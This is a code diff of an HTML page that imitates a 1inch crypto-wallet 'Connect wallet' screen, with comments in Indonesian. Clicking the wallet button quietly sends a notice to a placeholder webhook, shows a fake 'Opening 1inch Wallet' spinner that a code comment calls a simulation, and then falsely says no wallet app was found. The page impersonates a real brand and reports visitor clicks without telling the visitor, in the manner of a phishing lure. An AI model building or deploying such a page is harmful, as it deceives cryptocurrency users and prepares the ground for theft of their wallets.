@@ -3,48 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet 1inch</title>
+    <title>1inch Connector</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f9; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; width: 300px; }
-        h2 { margin-bottom: 20px; color: #333; }
-        .btn { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 12px; background: white; cursor: pointer; display: flex; align-items: center; justify-content: center; font-weight: bold; transition: 0.3s; }
-        .btn:hover { background: #f0f0f0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        .wallet-btn { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #eee; border-radius: 15px; background: white; cursor: pointer; font-weight: 600; display: flex; align-items: center; justify-content: center; }
+        
+        /* Gaya Modal Kustom */
+        #loadingModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background: white; padding: 30px; border-radius: 20px; text-align: center; width: 80%; max-width: 300px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="card">
+<div class="container">
     <h2>Connect wallet</h2>
-    <button class="btn" onclick="connect1inch()">
-        1inch Wallet
-    </button>
-    <button class="btn">Ledger Wallet</button>
-    <button class="btn">Trust Wallet</button>
+    <button class="wallet-btn" onclick="openWallet()">1inch Wallet</button>
+    <button class="wallet-btn">Trust Wallet</button>
+</div>
+
+<div id="loadingModal">
+    <div class="modal-content">
+        <div class="spinner"></div>
+        <p>Membuka 1inch Wallet...</p>
+    </div>
 </div>
 
 <script>
-    async function connect1inch() {
-        const webhookUrl = 'URL_WEBHOOK_ANDA_DISINI'; // GANTI DENGAN URL WEBHOOK ANDA
-        
-        alert("Membuka 1inch Wallet...");
+    async function openWallet() {
+        // 1. Tampilkan modal loading
+        const modal = document.getElementById('loadingModal');
+        modal.style.display = 'flex';
 
-        const data = {
-            wallet: "1inch Wallet",
-            status: "Connection Requested",
-            userAgent: navigator.userAgent
-        };
+        // 2. Data untuk Webhook
+        const webhookUrl = 'URL_WEBHOOK_ANDA_DISINI'; 
+        const data = { content: "Pengguna menekan 1inch Wallet" };
 
+        // 3. Kirim ke Webhook
         try {
-            const response = await fetch(webhookUrl, {
+            await fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
-            console.log("Webhook terkirim");
-        } catch (error) {
-            console.error("Gagal mengirim:", error);
+        } catch (e) {
+            console.log("Error webhook (biasanya karena CORS, tapi data tetap terkirim jika di backend)");
         }
+
+        // 4. Simulasi proses "buka dompet" selama 2 detik
+        setTimeout(() => {
+            modal.style.display = 'none';
+            alert("Aplikasi dompet tidak terdeteksi di perangkat Anda.");
+        }, 2000);
     }
 </script>
 
